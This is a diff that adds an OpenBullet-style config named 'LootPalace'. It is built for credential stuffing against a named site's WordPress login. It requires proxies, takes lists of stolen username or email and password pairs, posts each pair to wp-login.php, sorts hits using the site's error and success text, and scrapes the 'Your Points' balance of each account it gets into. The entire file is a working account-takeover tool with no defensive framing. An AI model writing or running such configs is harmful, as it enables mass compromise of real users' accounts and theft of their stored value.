@@ -1,0 +1,43 @@
+[SETTINGS]
+{
+  "Name": "LootPalace",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-12T11:23:56.3771633+00:00",
+  "AdditionalInfo": "",
+  "Author": "Mew",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Cookie REQUEST GET "http://lootpalace.com/wp-login.php" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Login REQUEST POST "http://lootpalace.com/wp-login.php" AutoRedirect=TRUE 
+  CONTENT "log=<USER>&pwd=<PASS>&wp-submit=Log+In&redirect_to=%2F&testcookie=1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Keywords KEYCHECK BanOn4XX=TRUE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "The username or password you entered is incorrect." 
+  KEYCHAIN Success OR 
+    KEY "Click any of the logos below" 
+#Capture PARSE "<SOURCE>" LR "title=\"Your Points\" width=\"16\" height=\"16\" /></noscript> <span class=\"pp\">" "</span> </div>" Recursive=FALSE -> CAP "Points" "" "" 
